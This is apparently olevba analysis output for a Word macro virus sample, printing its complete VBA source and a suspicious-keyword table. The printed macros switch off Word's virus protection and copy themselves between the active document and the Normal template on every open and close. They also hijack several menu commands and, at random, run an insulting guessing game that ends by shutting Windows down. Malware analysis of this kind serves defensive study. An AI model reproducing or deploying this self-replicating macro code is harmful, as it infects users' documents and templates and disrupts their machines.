olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Eraser.t
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Eraser.t - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO beauty2.bas 
in file: Virus.MSWord.Eraser.t - OLE stream: 'Macros/VBA/beauty2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Dim nor$: Dim fn$: Dim c
Dim ca: Dim con1: Dim cc
Dim ca1
On Error Resume Next

Dim dlg As Object: Set dlg = _
WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = _
dlg.Template
fn$ = _
WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)
con = _
WordBasic.CountAutoTextEntries(0)
If con > 0 Then
For c = 1 To con
If WordBasic.[AutoTextName$](c, 0) = _
"lamo" Then ca = _
1
Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "lamo", Tab:= _
 1
 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "p1", Tab:= _
 1
 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "p2", Tab:= _
 1
 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "p3", Tab:= _
 1

End If

On Error Resume Next
  
Options.VirusProtection = False
Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate
DocumentInstalled = False
GlobalInstalled = False

For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty2" Then
DocumentInstalled = True
End If
Next

For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty2" Then
GlobalInstalled = True
End If
Next

If DocumentInstalled = False Then
Application.OrganizerCopy Source:= _
NormalTemplate.FullName, Destination:= _
ActiveDocument.FullName, Name:= _
"Beauty2", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs , FileFormat:=wdFormatTemplate
        
       
End If

con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
For cc = 1 To con1
If WordBasic.[AutoTextName$](cc, 1) = _
"lamo" Then ca1 = _
1
Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"lamo", Tab:= _
1
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"p1", Tab:= _
1
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"p2", Tab:= _
1
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"p3", Tab:= _
1
End If

If GlobalInstalled = False Then
Application.OrganizerCopy Source:= _
ActiveDocument.FullName, Destination:= _
NormalTemplate.FullName, Name:= _
"Beauty2", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
             
End If

'WordBasic.DocClose 1

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:

End Sub
Sub AutoOpen()
Dim nor$: Dim fn$: Dim c
Dim ca: Dim con1: Dim cc
Dim ca1
On Error Resume Next

Dim dlg As Object: Set dlg = _
WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = _
dlg.Template
fn$ = _
WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)
con = _
WordBasic.CountAutoTextEntries(0)
If con > 0 Then
For c = 1 To con
If WordBasic.[AutoTextName$](c, 0) = _
"lamo" Then ca = _
1
Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "lamo", Tab:= _
 1
 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "p1", Tab:= _
 1
 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "p2", Tab:= _
 1
 WordBasic.Organizer Copy:= _
 1, Source:= _
 fn$, Destination:= _
 nor$, Name:= _
 "p3", Tab:= _
 1

End If

On Error Resume Next
  
Options.VirusProtection = False
Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate
DocumentInstalled = False
GlobalInstalled = False

For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty2" Then
DocumentInstalled = True
End If
Next

For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty2" Then
GlobalInstalled = True
End If
Next

If DocumentInstalled = False Then
Application.OrganizerCopy Source:= _
NormalTemplate.FullName, Destination:= _
ActiveDocument.FullName, Name:= _
"Beauty2", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs , FileFormat:=wdFormatTemplate
        
       
End If

con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
For cc = 1 To con1
If WordBasic.[AutoTextName$](cc, 1) = _
"lamo" Then ca1 = _
1
Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"lamo", Tab:= _
1
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"p1", Tab:= _
1
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"p2", Tab:= _
1
WordBasic.Organizer Copy:= _
1, Source:= _
nor$, Destination:= _
fn$, Name:= _
"p3", Tab:= _
1
End If

If GlobalInstalled = False Then
Application.OrganizerCopy Source:= _
ActiveDocument.FullName, Destination:= _
NormalTemplate.FullName, Name:= _
"Beauty2", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
             
End If

'WordBasic.DocClose 1

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:

End Sub
Sub GAME()
Dim R
Dim num
Dim ANS
R = 1
WordBasic.BeginDialog 478, 216, "美 女 拳 2 for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p3", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "嗨 ! 和 我 猜 個 拳 吧!!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "猜 贏 就 讓 你 看 精 彩 的 !!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "就 算 是 猜 輸 了 !!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "別 怕 !! 絕 不 會 傷 你 的", "Text4"
    WordBasic.Text 266, 84, 190, 13, "寶 貝 電 腦 一 分 一 毫 的 !! ", "Text5"
    WordBasic.Text 266, 103, 190, 13, "放 心 玩 吧 !", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "那我出剪刀好了!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "那我出石頭好了!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "那我出布好了!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = _
WordBasic.CurValues.UserDialog
num = _
WordBasic.Int(Rnd() * 5) + 1
ANS = _
WordBasic.Dialog.UserDialog(gdh)
If num >= 4 Then
recall
GoTo guessgame

End If
If ANS = num Then
WordBasic.MsgBox "別  高  興 !! 我  是  看  你  可  憐 ， 才  故  意  輸  你  的 !!", "美 女 拳 2 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "遜  斃  了 !! 要  不  要  我  讓  你  一  把  ㄚ ??", "美 女 拳 2 for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "沒  見  過  像  你  這  樣  矬  的  人  !!  小  姐  我  不  陪  你  耗  了 !!", "美 女 拳 2 for Word97", 64
WordBasic.FileSaveAll
Task.ExitWindows

exit_:
guess1
End Sub

Private Sub guess1()
Dim R
Dim num
Dim ANS
R = 1
WordBasic.BeginDialog 478, 216, "美 女 拳 2 for Word97 "
    WordBasic.Picture 10, 6, 238, 199, "lamo", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "前面一關是故意放水的!!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "這回得看你的真本事啦!!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "看你的好運能持續多久?", "Text3"
    WordBasic.Text 266, 65, 190, 13, "專心點!!", "Text4"
    WordBasic.Text 266, 84, 190, 13, "可別輸得太難看喔!!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "我的技術可是一流的喔!!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "那我出剪刀好了!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "那我出石頭好了!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "那我出布好了!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = _
WordBasic.CurValues.UserDialog
num = _
WordBasic.Int(Rnd() * 7) + 1
ANS = _
WordBasic.Dialog.UserDialog(gdh)
If num >= 6 Then
recall
GoTo guessgame

End If

If ANS = num Then
WordBasic.MsgBox "氣  死  人  了 !! 你  的  運  氣  怎  麼  這  麼  好  ?", "美 女 拳 2 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "回  去  吃  奶  吧 !! 乳  臭  未  乾  的  小  子 !!", "美 女 拳 2 for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "天  字  第  一  號  大  白  癡 !!!! 過  來  舔  我  的  腳  趾  頭  吧 !!", "美 女 拳 2 for Word97", 64
WordBasic.FileSaveAll
Task.ExitWindows


exit_:
guess2
End Sub

Private Sub guess2()
Dim R
Dim num
Dim ANS
R = 1
WordBasic.BeginDialog 478, 216, "美 女 拳 2 for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p1", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "不簡單喔!能連闖兩關!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "果然是個中高手!!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "但，你可別想輕易過我", "Text3"
    WordBasic.Text 266, 65, 190, 13, "這一關!!ㄟ!!ㄟ!!拜託", "Text4"
    WordBasic.Text 266, 84, 190, 13, "把掛在嘴角的口水擦一擦!!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "這樣很難看耶!!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "那我出剪刀好了!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "那我出石頭好了!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "那我出布好了!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = _
WordBasic.CurValues.UserDialog
num = _
WordBasic.Int(Rnd() * 7) + 1
ANS = _
WordBasic.Dialog.UserDialog(gdh)
If num >= 7 Then
recall
GoTo guessgame

End If

If ANS = num Then
WordBasic.MsgBox "喂 !! 你  有  作  弊  的  嫌  疑  喔 !!", "美 女 拳 2 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "喂 !! 你   還   沒   睡   醒   ㄚ ????", "美 女 拳 2 for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "癩  蝦  蟆  想  吃  天  鵝  肉  !! 還  早  著  呢  !! 一  邊  涼  快  去 !!", "美 女 拳 2 for Word97", 64
WordBasic.FileSaveAll
Task.ExitWindows

exit_:
guess3
End Sub

Private Sub guess3()
Dim num
Dim ANS
WordBasic.BeginDialog 478, 216, "美 女 拳 2 for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p2", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "一路過關斬將!真有你的!!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "這是最後一關!!有本事贏我", "Text2"
    WordBasic.Text 266, 46, 184, 13, "就讓你看精彩的!!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "輸了!!也沒啥大不了的!!", "Text4"
    WordBasic.Text 266, 84, 190, 13, "只怪你技術太爛!!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "呦!!你怎麼流鼻血了??", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "那我出剪刀好了!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "那我出石頭好了!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "那我出布好了!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = _
WordBasic.CurValues.UserDialog
num = _
WordBasic.Int(Rnd() * 10) + 1
ANS = _
WordBasic.Dialog.UserDialog(gdh)
If num >= 6 Then
recall
GoTo guessgame

End If

If ANS = num Then
WordBasic.MsgBox "討  厭  啦  !! 剛  才  那  一  拳  不  算  啦  !!", "美 女 拳 2 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "ㄟ !! 我   贏  了!! 這  叫  實  力  !! 你   懂  不  懂  ㄚ??", "美 女 拳 2 for Word97", 64
GoTo guessgame



exit_:
On Error Resume Next
WordBasic.FileNewDefault
WordBasic.CenterPara
WordBasic.FormatFont Points:=48, Underline:=0, Color:=6, Bold:=1
WordBasic.Insert "呦!!大豬哥!!沒啦!!難到你還想看限制級的ㄚ????"
WordBasic.FileSaveAll
WordBasic.DocClose 1
Task.ExitWindows

End Sub

Private Sub recall()

ANS:
Dim RE
RE = WordBasic.Int(Rnd() * 10)
If RE > 9 Or RE < 3 Then GoTo ANS

If RE = 3 Then
WordBasic.Beep
WordBasic.MsgBox "好   吧 !!  這   回   平   手 ! 再  猜  一  拳  吧 !! ", "美 女 拳 2 for Word97", 64
K = 1
End If

If RE = 4 Then
WordBasic.Beep
WordBasic.MsgBox "搞  什  麼  嘛 !! 竟   然   沒   有   輸   贏 !!", "美 女 拳 2 for Word97", 64
End If

If RE = 5 Then
WordBasic.Beep
WordBasic.MsgBox "怪  怪 !!!! 你  耍  詐  喔  ?!", "美 女 拳 2 for Word97", 64
 End If

If RE = 6 Then
WordBasic.Beep
WordBasic.MsgBox "不  可  能  吧 !! 有  本  事  下  一  拳  贏  我 !!", "美 女 拳 2 for Word97", 64
End If

 If RE = 7 Then
WordBasic.Beep
WordBasic.MsgBox "ㄟ..............!!  這   很   邪   門   喔 !! ", "美 女 拳 2 for Word97", 64
End If

If RE = 8 Then
WordBasic.Beep
WordBasic.MsgBox "哼 !! 一  定  是  你  在  搞  鬼， 不  然  怎  麼  會  這  樣 !!", "美 女 拳 2 for Word97", 64
End If

If RE = 9 Then
WordBasic.Beep
WordBasic.MsgBox "@$#*%#@#!!拿  出  你  的  真  本  事  吧!! 別  再  掙  扎  了 ", "美 女 拳 2 for Word97", 64
End If


End Sub
Sub FileTemplates()
Dim G
K = _
WordBasic.Int(Rnd() * 10)
If G >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep

bye:

End Sub
Sub ToolsOptions()
Dim G
K = _
WordBasic.Int(Rnd() * 10)
If G >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep

bye:
End Sub
Sub ViewVbCode()
Dim G
K = _
WordBasic.Int(Rnd() * 10)
If G >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep

bye:

End Sub
Sub ToolsMacro()
Dim G
K = _
WordBasic.Int(Rnd() * 10)
If G >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep

bye:

End Sub
Sub Toolscustomize()
Dim G
K = _
WordBasic.Int(Rnd() * 10)
If G >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep

bye:
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

